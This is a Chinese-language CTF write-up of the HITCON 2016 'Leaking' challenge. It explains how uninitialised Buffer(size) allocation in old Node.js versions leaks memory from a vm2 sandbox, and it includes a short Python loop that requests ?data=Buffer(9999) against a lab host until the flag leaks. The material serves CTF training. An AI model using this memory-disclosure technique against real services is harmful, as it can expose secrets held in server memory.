---
title: '[HITCON 2016]Leaking'
date: 2024-10-20 15:35:53
tags:
      - nodejs
      - 沙箱逃逸
categories: 刷题笔记
---

## [HITCON 2016]Leaking

![image-20241020162243992](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410201622073.png)

这是一道nodejs的题，我们翻看一下[nodejs相关安全问题](https://www.cnblogs.com/20175211lyz/p/12659738.html)，我们发现这里使用了vm沙箱，那最有可能考的是vm沙箱逃逸

<!--more-->



![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8e3d6018d90eefa6f76e9eba07b4bc59.png)

我们找到关键的代码，这里生成了flag

```
eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
eval就是把里面的当作javascript语句来运行
var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
然后要Get传递一个data参数，将它放在vm2创建的沙盒中运行，并且对传入的参数长度进行了限制，不超过12，这里可以用数组绕过

```

这里就得说说这道题的考点了，这里涉及到的是nodejs的远古内存分配问题，nodejs在远古版本（Node.js v5.4.1/v4.2.4）中的Buffer分配是就着以前用过的内存分配的，并且分配完了还不会初始化一下，也就意味着之前加载进内存然后被回收掉的内存位置可能被再次分配出来，并且还不会被初始化，原始数据还保留在那。这位外国老哥在[这里](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)分析了原理
![image-20241020162857708](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410201628753.png)

所以如果使用new Buffer(size)或其别名Buffer(size)）创建,则对象不会填充零,而只要是调用过的变量，一定会存在内存中，所以需要使用Buffer()来读取内存，使用data=Buffer(9999)分配一个9999的单位为8位字节的buffer，因此很容易得到姿势
exp

```
import requests

session = requests.Session()
session.trust_env = False
while True:
    response = session.get('http://179cca2f-d3e8-431c-95bd-191625b63e16.node5.buuoj.cn:81/?data=Buffer(9999)')
    if "flag" in response.text:
        print(response.text)
        break

```

![image-20241020162935072](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410201629108.png)

最后再提一下这题的考点

在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。

